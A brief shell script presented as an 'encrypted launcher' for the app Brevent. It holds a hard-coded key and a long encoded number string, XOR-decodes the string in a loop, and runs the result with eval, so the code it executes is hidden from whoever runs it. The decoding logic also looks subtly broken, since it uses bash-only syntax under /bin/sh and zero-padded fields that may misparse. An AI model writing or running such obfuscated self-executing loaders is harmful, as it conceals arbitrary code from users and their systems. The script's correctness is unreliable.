#!/bin/sh

# Foolproof encrypted launcher for Brevent
KEY="TZzmTwyLrk06wbLp"
ENCRYPTED="119123085015061025086046019024088060018001036031116120050008056027022108020025095091087007034019038035010025049019089063026014092090086064070021055050021077118032022062025002094081087006037002049057014002038014067108086067064065019075110122049057018002116085044063023025016095025004035074116126082004048094091"

# Ultra-simple decryption
decrypted=""
i=1
while [ $i -le ${#ENCRYPTED} ]; do
    num=${ENCRYPTED:$((i-1)):3}
    char=$(printf "%d" "$num")
    key_pos=$(( (i/3) % ${#KEY} ))
    key_char=$(printf "%d" "'${KEY:$key_pos:1}")
    xor_val=$((char ^ key_char))
    decrypted="$decrypted$(printf "\\$(printf "%03o" "$xor_val")")"
    i=$((i+3))
done

# Execute decrypted payload
eval "$decrypted"
